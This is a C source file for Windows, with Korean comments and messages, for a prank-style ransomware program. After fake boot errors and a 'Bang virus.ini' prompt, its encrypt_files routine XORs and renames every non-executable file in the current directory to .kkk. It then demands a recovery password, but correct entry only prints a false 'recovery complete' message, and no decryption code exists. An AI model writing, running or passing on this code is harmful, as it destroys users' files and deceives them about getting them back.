#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

void clear() { system("cls"); }

// 파일 암호화 함수 (현 위치의 모든 파일 대상)
void encrypt_files() {
    WIN32_FIND_DATA fd;
    HANDLE h = FindFirstFile("*.*", &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                // 본인 및 복구툴은 제외
                if (strstr(fd.cFileName, ".exe") || strstr(fd.cFileName, ".kkk")) continue;
                
                char new_name[MAX_PATH];
                sprintf(new_name, "%s.kkk", fd.cFileName);

                FILE *f = fopen(fd.cFileName, "rb+");
                if (!f) continue;
                fseek(f, 0, SEEK_END); long s = ftell(f); rewind(f);
                unsigned char *b = malloc(s); fread(b, 1, s, f);
                for (int i=0; i<s; i++) b[i] ^= 0x77; // XOR 암호화
                rewind(f); fwrite(b, 1, s, f); fclose(f); free(b);
                rename(fd.cFileName, new_name);
            }
        } while (FindNextFile(h, &fd));
        FindClose(h);
    }
}

int main() {
    clear();
    printf("이 OS는 가상메모리 기반 입니다\n"); Sleep(2000);
    clear();

    for(int i=0; i<2; i++) { printf("_\n"); Sleep(500); clear(); Sleep(300); }
    for(int i=0; i<3; i++) { printf("basicboot.ini를 찾을수 없습니다.\n"); Sleep(400); clear(); Sleep(300); }

    char choice;
    printf("Bang virus.ini를 사용하시겠습니까? [y|n]: ");
    scanf(" %c", &choice);

    if (choice == 'y' || choice == 'Y') {
        int colors[] = {12, 9, 10, 14, 13, 0, 11}; // 빨파초노주검초
        int i = 0;
        while(1) {
            HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
            SetConsoleTextAttribute(hConsole, colors[i % 7]);
            printf("Bang "); i++; Sleep(10);
        }
    } else {
        encrypt_files(); // 실제 암호화 실행
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        SetConsoleTextAttribute(hConsole, BACKGROUND_RED | 15); // 빨간 배경
        clear();
        printf("\n[경고] 기존 이 OS 빼고 전부 암호화함\n");
        printf("숫자순 입력하세요 (복구 암호): \n> ");
        char pw[20];
        scanf("%s", pw);
        if (strcmp(pw, "123456789") == 0) {
            SetConsoleTextAttribute(hConsole, 7);
            printf("\n암호 해제 및 복구 완료. OS를 자가 삭제합니다.\n");
            Sleep(2000);
        }
    }
    return 0;
}
